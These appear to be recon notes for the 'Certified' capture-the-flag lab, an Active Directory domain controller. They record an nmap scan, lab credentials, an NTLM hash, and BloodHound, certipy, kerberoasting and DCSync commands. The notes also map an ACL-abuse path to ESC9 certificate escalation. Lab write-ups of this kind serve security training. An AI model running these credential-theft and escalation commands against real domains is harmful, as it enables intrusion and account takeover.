# Certified — Recon

## Target
| Field | Value |
|-------|-------|
| IP | 10.129.231.186 |
| Hostname | DC01.certified.htb |
| OS | Windows (Domain Controller) |
| Domain | certified.htb |

## Nmap Scan
```
sudo nmap -sC -sV -Pn 10.129.231.186
```

**Results:**
| Port | State | Service | Version |
|------|-------|---------|---------|
| 53/tcp | open | domain | Simple DNS Plus |
| 88/tcp | open | kerberos-sec | Microsoft Windows Kerberos |
| 135/tcp | open | msrpc | Microsoft Windows RPC |
| 139/tcp | open | netbios-ssn | Microsoft Windows netbios-ssn |
| 389/tcp | open | ldap | Microsoft Active Directory LDAP |
| 445/tcp | open | microsoft-ds | SMB |
| 464/tcp | open | kpasswd5 | Kerberos password change |
| 593/tcp | open | ncacn_http | RPC over HTTP |
| 636/tcp | open | ssl/ldap | LDAPS |
| 3268/tcp | open | ldap | Global Catalog LDAP |
| 3269/tcp | open | ssl/ldap | Global Catalog LDAPS |
| 5985/tcp | open | http | WinRM (HTTPAPI 2.0) |

**Host scripts:**
- SMB signing enabled and required
- DC01.certified.htb identified as Domain Controller

## Initial Credentials
| Username | Password | Source |
|----------|----------|--------|
| judith.mader | judith09 | Provided |

## Domain Enumeration

### BloodHound (bloodhound-python)
```
bloodhound-python -u judith.mader -p judith09 -d certified.htb -c all -ns 10.129.231.186
```
- Found 10 users, 53 groups, 1 computer (DC01), 2 GPOs, 1 OU
- Data saved: `certified_bloodhound.zip` in loot/

### AD CS Enumeration (certipy-ad)
```
certipy-ad find -u judith.mader -p judith09 -dc-ip 10.129.231.186
certipy-ad find -u management_svc -hashes a091c1832bcdd4677c28b5a6a1295584 -dc-ip 10.129.231.186 -vulnerable
```

**Certificate Authority:**
- Name: `certified-DC01-CA`
- DNS: `DC01.certified.htb`
- Serial: `36472F2C180FBB9B4983AD4D60CD5A9D`

**Vulnerable Templates:**

| Template | Enrollment Rights | ESC9 Vulnerable | Client Auth |
|---|---|---|---|
| `CertifiedAuthentication` | `operator ca`, Domain Admins, Enterprise Admins | **YES** | Yes |

**CertifiedAuthentication Template Details:**
- Display Name: Certified Authentication
- Schema Version: 2
- `SubjectAltRequireUpn`: Yes
- `SubjectRequireDirectoryPath`: Yes
- `NoSecurityExtension`: **ABSENT** (this is what makes it ESC9 vulnerable!)
- Validity Period: 1000 years
- Renewal Period: 6 weeks
- No manager approval required

### Key Users
| User | RID | Notes |
|---|---|---|
| judith.mader | ? | Low-priv domain user; has WriteOwner on Management group |
| management_svc | S-1-5-21-...-1105 | Service account; member of Management + Remote Management Users |
| ca_operator | ? | CA operator; has enrollment rights on ESC9 template |
| Administrator | S-1-5-21-...-500 | Domain Administrator |

### Key Groups
| Group | SID | Members |
|---|---|---|
| Management | S-1-5-21-...-526 | management_svc, judith.mader (added during attack) |
| Remote Management Users | Built-in | management_svc (enables WinRM access) |

### Key Attack Path (BloodHound)

```
judith.mader --WriteOwner--> Management --GenericWrite--> management_svc
                                                        |
                                        management_svc --GenericAll--> ca_operator
                                                                        |
                                                        operator ca --enroll--> CertifiedAuthentication (ESC9)
```

### management_svc Object Details
- **DN:** CN=management service,CN=Users,DC=certified,DC=htb
- **sAMAccountName:** management_svc
- **servicePrincipalName:** certified.htb/management_svc.DC01
- **MemberOf:** CN=Management,CN=Users,DC=certified,DC=htb; CN=Remote Management Users,CN=Builtin,DC=certified,DC=htb
- **userAccountControl:** NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
- **PasswordLastSet:** 2024-05-13 23:30:51
- **badPwdCount:** 1 (someone previously failed to authenticate)

### Kerberoasting Attempt
```bash
impacket-GetUserSPNs -dc-ip 10.129.231.186 -request-user management_svc \
  certified.htb/judith.mader:judith09
```
- Retrieved TGS hash for management_svc (saved to `raw_data/management_svc.hash`)
- **Failed** — Kerberos `KRB_AP_ERR_SKEW` (clock skew too great)
  - Fixed with: `net time set -S 10.129.231.186`
- Hash cracking with rockyou.txt and other wordlists: **FAILED** (password not in wordlists)

### Other Enumeration Findings

**impacket-secretsdump (DCSync attempt):**
```bash
impacket-secretsdump certified.htb/judith.mader:judith09@10.129.231.186
```
- Failed: `rpc_s_access_denied` — judith lacks DCSync rights
- DRSR errors: `ERROR_DS_DRA_BAD_DN`

**bloodyAD genericAll attempt:**
```bash
bloodyAD --host 10.129.231.186 -d certified.htb -u judith.mader -p judith09 \
  add genericAll management_svc judith.mader
```
- Failed: `INSUFF_ACCESS_RIGHTS` — bloodyAD uses LDAP; requires existing ACL write access
- Resolution: `net rpc` uses SMB/DCE-RPC and bypasses this limitation

## Observations
- This is a Windows AD Domain Controller running Active Directory Certificate Services (AD CS)
- judith.mader is a low-privilege user with a precise BloodHound attack path
- The chain relies entirely on ACL abuse — no password reuse or brute-forcing
- management_svc has WinRM access via `Remote Management Users` group membership
- AD CS ESC9 vulnerability provides a clear path from management_svc to Domain Admin
- Two-stage attack: Shadow Credentials (user flag) → ESC9 (root flag)

## Next Steps
- [x] Enumerate domain with BloodHound
- [x] Identify judith.mader → Management → management_svc attack chain
- [x] Exploit WriteOwner + GenericWrite to gain code execution as management_svc
- [x] Escalate to Domain Admin via ADCS ESC9
